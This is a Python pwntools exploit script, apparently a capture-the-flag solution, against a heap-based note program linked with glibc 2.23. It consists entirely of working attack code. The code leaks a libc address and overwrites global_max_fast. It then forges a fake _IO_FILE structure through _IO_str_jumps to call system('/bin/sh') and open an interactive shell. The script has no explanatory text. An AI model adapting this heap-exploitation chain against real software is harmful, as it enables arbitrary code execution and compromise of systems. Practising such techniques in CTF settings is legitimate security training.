from pwn import*
def new(size,content):
	p.sendlineafter('exit','1')
	p.sendlineafter('size',str(size))
	p.sendafter('note',content)
def free(index):
	p.sendlineafter('exit','2')
	p.sendlineafter('id:',str(index))
def login(name,choice):
	p.sendlineafter('exit','3')
	p.sendafter('name',name)
	p.sendlineafter('type',str(choice))
p = process('./main')
libc = ELF('./libc-2.23.so',checksec=False)
context.log_level ='DEBUG'
new(0x300,'FMYY\n')
new(0x1400,'FMYY\n')
free(0)
new(0x300,'\n')
p.recvline()
p.recvline()
libc_base = u64(p.recv(6).ljust(8,'\x00')) - 88 - libc.sym['__malloc_hook'] - 0x10
log.info('LIBC:\t' + hex(libc_base))
binsh = libc_base + libc.search('/bin/sh').next()
system = libc_base + libc.sym['system']
Global_max_fast = libc_base + 0x3C67F8
IO_list_all = libc_base + libc.sym['_IO_list_all']
IO_str_jumps = libc_base +0x3C37A0
login(p64(0) + p64(Global_max_fast-8),1)
free(1)
fake_IO_FILE  = p64(0xFBAD2887) + p64(0)*3
fake_IO_FILE += p64(0) + p64(1)#satisfy write_base < write_ptr
fake_IO_FILE += p64(0) + p64(binsh)
fake_IO_FILE = fake_IO_FILE.ljust(0xC0,'\x00')
fake_IO_FILE += p64(0xFFFFFFFFFFFFFFFF) + p64(0)*2
fake_IO_FILE += p64(IO_str_jumps-8)
fake_IO_FILE += p64(0) + p64(system)
new(0x1400,fake_IO_FILE[0x10:] + '\n')
free(1)
p.sendlineafter('exit','1')
p.sendlineafter('size','512')
p.interactive()

